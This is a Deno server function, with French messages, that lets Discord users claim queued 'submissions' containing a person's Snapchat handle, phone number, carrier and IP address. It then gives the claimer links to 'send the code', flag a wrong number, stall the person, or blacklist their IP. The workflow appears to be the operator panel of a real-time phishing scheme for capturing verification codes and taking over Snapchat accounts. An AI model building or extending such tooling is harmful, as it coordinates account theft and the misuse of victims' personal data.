import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

function hexToBytes(hex) {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.slice(i, i + 2), 16);
  }
  return bytes;
}

async function verifySignature(req, bodyText) {
  const sig = req.headers.get("X-Signature-Ed25519");
  const ts = req.headers.get("X-Signature-Timestamp");
  const pubKey = Deno.env.get("DISCORD_PUBLIC_KEY");
  if (!sig || !ts || !pubKey) return false;
  try {
    const key = await crypto.subtle.importKey("raw", hexToBytes(pubKey), { name: "Ed25519" }, false, ["verify"]);
    const msg = new TextEncoder().encode(ts + bodyText);
    return await crypto.subtle.verify("Ed25519", key, hexToBytes(sig), msg);
  } catch {
    return false;
  }
}

async function botAPI(endpoint, method = "GET", body = null) {
  const res = await fetch(`https://discord.com/api/v10${endpoint}`, {
    method,
    headers: {
      "Authorization": `Bot ${Deno.env.get("DISCORD_BOT_TOKEN")}`,
      "Content-Type": "application/json"
    },
    body: body ? JSON.stringify(body) : undefined
  });
  const text = await res.text();
  if (!res.ok) throw new Error(`Discord ${res.status}: ${text}`);
  return text ? JSON.parse(text) : {};
}

Deno.serve(async (req) => {
  const bodyText = await req.text();

  if (!await verifySignature(req, bodyText)) {
    return new Response("Invalid signature", { status: 401 });
  }

  const body = JSON.parse(bodyText);

  // Discord PING handshake
  if (body.type === 1) return Response.json({ type: 1 });

  // Button click
  if (body.type === 3 && body.data?.custom_id?.startsWith("claim_")) {
    const submissionId = body.data.custom_id.replace("claim_", "");
    const userId = body.member?.user?.id || body.user?.id;
    const username = body.member?.user?.username || body.user?.username;
    const channelId = body.channel_id;
    const messageId = body.message?.id;

    const base44 = createClientFromRequest(req);

    // Fetch submission
    let sub;
    try {
      sub = await base44.asServiceRole.entities.Submission.get(submissionId);
    } catch {
      return Response.json({ type: 4, data: { content: "❌ Soumission introuvable.", flags: 64 } });
    }

    // Already claimed?
    if (sub.claimed_by_discord_id) {
      return Response.json({ type: 4, data: { content: "⚠️ Cette demande a déjà été prise en charge par quelqu'un.", flags: 64 } });
    }

    // Claim it
    await base44.asServiceRole.entities.Submission.update(submissionId, { claimed_by_discord_id: userId });

    // Race condition check
    const updated = await base44.asServiceRole.entities.Submission.get(submissionId);
    if (updated.claimed_by_discord_id !== userId) {
      return Response.json({ type: 4, data: { content: "⚡ Quelqu'un d'autre l'a pris juste avant vous!", flags: 64 } });
    }

    const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "";
    const msgContent =
      `🔐 **Demande prise en charge par <@${userId}>**\n\n` +
      `👻 **Snapchat:** @${sub.snapchat || "N/A"}\n` +
      `📞 **Téléphone:** ${sub.telephone || "N/A"}\n` +
      `📡 **Opérateur:** ${sub.operateur || "N/A"}\n\n` +
      `✅ [Envoyer le code](${appUrl}/?trigger=${submissionId})\n` +
      `❌ [Mauvais numéro](${appUrl}/?triggerAction=wrong&id=${submissionId})\n` +
      `⏳ [Faire patienter](${appUrl}/?triggerAction=wait&id=${submissionId})\n` +
      `🚫 [Blacklist](${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(sub.ip_address || "")})`;

    let responseMsg = "✅ Vous avez pris en charge cette demande !";

    // Try private thread first
    try {
      const thread = await botAPI(`/channels/${channelId}/threads`, "POST", {
        name: `📋 ${sub.snapchat || "Demande"} — ${sub.operateur || ""}`,
        type: 12, // GUILD_PRIVATE_THREAD
        auto_archive_duration: 60,
        invitable: false
      });
      await botAPI(`/channels/${thread.id}/thread-members/${userId}`, "PUT");
      await botAPI(`/channels/${thread.id}/messages`, "POST", { content: msgContent });
      responseMsg = "✅ Thread privé créé ! Vérifiez vos threads Discord.";
    } catch (e) {
      console.error("Private thread failed, trying DM:", e.message);
      // Fallback to DM
      try {
        const dm = await botAPI("/users/@me/channels", "POST", { recipient_id: userId });
        await botAPI(`/channels/${dm.id}/messages`, "POST", { content: msgContent });
        responseMsg = "✅ Pris en charge ! Vérifiez vos DMs.";
      } catch (e2) {
        console.error("DM failed:", e2.message);
      }
    }

    // Disable button on original message via webhook edit (no MANAGE_MESSAGES needed)
    try {
      const webhookUrl = Deno.env.get("DISCORD_WEBHOOK") || "";
      const match = webhookUrl.match(/webhooks\/(\d+)\/([^\/\?]+)/);
      if (match) {
        const [, wId, wToken] = match;
        await fetch(`https://discord.com/api/v10/webhooks/${wId}/${wToken}/messages/${messageId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            components: [{
              type: 1,
              components: [{
                type: 2,
                style: 2,
                label: `✅ Pris par @${username}`,
                custom_id: "claimed",
                disabled: true
              }]
            }]
          })
        });
      }
    } catch (e) {
      console.error("Failed to edit original message:", e.message);
    }

    return Response.json({ type: 4, data: { content: responseMsg, flags: 64 } });
  }

  return Response.json({ type: 1 });
});